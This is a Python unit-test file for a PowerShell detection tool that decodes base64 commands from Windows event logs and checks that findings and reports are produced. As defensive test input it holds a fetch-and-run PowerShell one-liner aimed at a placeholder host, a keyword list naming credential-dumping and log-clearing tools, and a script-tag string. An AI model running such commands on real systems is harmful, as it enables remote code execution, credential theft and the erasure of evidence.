from __future__ import annotations

import base64
from datetime import datetime, timezone
import unittest

from cat_app.analyzer import analyze_events
from cat_app.models import EventRecord, ParseResult
from cat_app.reporting import generate_rule_report


def _encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16le")).decode("ascii")


def _analysis(script: str, *, script_block: bool = False) -> dict:
    event = EventRecord(
        source_file="powershell-integration.evtx",
        event_id="4104" if script_block else "1",
        provider="Microsoft-Windows-PowerShell" if script_block else "Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-PowerShell/Operational" if script_block else "Microsoft-Windows-Sysmon/Operational",
        computer="PS-TEST", record_id="42",
        time_created=datetime(2026, 1, 1, tzinfo=timezone.utc),
        event_data={
            "ProcessGuid": "{abababab-abab-abab-abab-abababababab}",
            "ProcessId": "420",
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "ParentImage": r"C:\Windows\explorer.exe",
            **({"ScriptBlockText": "[Convert]::FromBase64String('" + _encoded(script) + "')"}
               if script_block else {"CommandLine": "powershell.exe -EncodedCommand " + _encoded(script)}),
        },
    )
    parsed = ParseResult(records=[event], files=[], errors=[], total_seen=1, total_in_range=1)
    return analyze_events(parsed, None, None)


class PowerShellIntegrationTests(unittest.TestCase):
    def test_benign_encoding_does_not_create_intrusion_origin_or_high_finding(self) -> None:
        for script in ("Get-Date", "Write-Output '정상 시스템 진단'"):
            with self.subTest(script=script):
                analysis = _analysis(script)
                self.assertNotIn("suspicious_powershell", {item["rule_id"] for item in analysis["findings"]})
                self.assertFalse(analysis["intrusion_chain"].get("origin_process"))
                self.assertFalse(any(item["severity"] in {"high", "critical"} for item in analysis["findings"]))
                self.assertEqual(analysis["sample_events"][0]["decoded_powershell"]["decoded_scripts"][0]["text"], script)

    def test_decoded_quoted_keywords_and_comments_do_not_become_actions(self) -> None:
        scripts = (
            "Write-Output 'mimikatz sekurlsa lsass wevtutil cl schtasks IEX DownloadString'",
            "Get-Date\n# mimikatz sekurlsa lsass wevtutil cl schtasks IEX DownloadString",
            "Get-Date\n<# mimikatz sekurlsa lsass wevtutil cl schtasks IEX DownloadString #>",
        )
        for script in scripts:
            with self.subTest(script=script[:25]):
                analysis = _analysis(script)
                self.assertEqual(analysis["sample_events"][0]["decoded_powershell"]["signals"], [])
                self.assertFalse(analysis["intrusion_chain"].get("origin_process"))
                self.assertFalse(any(item["severity"] in {"medium", "high", "critical"} for item in analysis["findings"]))

    def test_scriptblock_base64_constant_alone_does_not_create_high_finding(self) -> None:
        analysis = _analysis("Write-Output '정상'", script_block=True)
        self.assertNotIn("suspicious_powershell", {item["rule_id"] for item in analysis["findings"]})
        self.assertFalse(analysis["intrusion_chain"].get("origin_process"))

    def test_real_decoded_command_signals_reach_report_with_raw_source(self) -> None:
        script = "IEX ((New-Object Net.WebClient).DownloadString('https://example.invalid/test.ps1'))"
        analysis = _analysis(script)
        self.assertIn("suspicious_powershell", {item["rule_id"] for item in analysis["findings"]})
        evidence = analysis["report_evidence"][0]
        self.assertIn("download_and_execute_pattern", evidence["decoded_powershell"]["signals"])
        report, metadata = generate_rule_report(analysis)
        self.assertIn(script, report)
        self.assertIn("powershell-integration.evtx", report)
        self.assertIn("record=42", report)
        self.assertIn("스크립트를 실행하지 않았", report)
        self.assertTrue(metadata["report_evidence_appended"])

    def test_decoded_html_and_backticks_stay_inside_report_code_fence(self) -> None:
        script = "IEX (iwr https://example.invalid/test)\n# ```\n# <script>alert('test')</script>"
        analysis = _analysis(script)
        report, _ = generate_rule_report(analysis)
        self.assertIn("````powershell\n" + script + "\n````", report)

    def test_large_decoded_script_has_explicit_original_and_decoded_limits(self) -> None:
        script = "IEX (iwr https://example.invalid/test)\n# " + "X" * 16000
        analysis = _analysis(script)
        evidence = analysis["report_evidence"][0]
        self.assertIn("CommandLine", evidence["text_truncated_fields"])
        self.assertTrue(evidence["decoded_powershell"]["decoded_scripts"][0]["text_truncated"])
        report, _ = generate_rule_report(analysis)
        self.assertIn("필드 보관 한계", report)
        self.assertIn("스크립트 본문이 정적 분석 보관 상한", report)


if __name__ == "__main__":
    unittest.main()
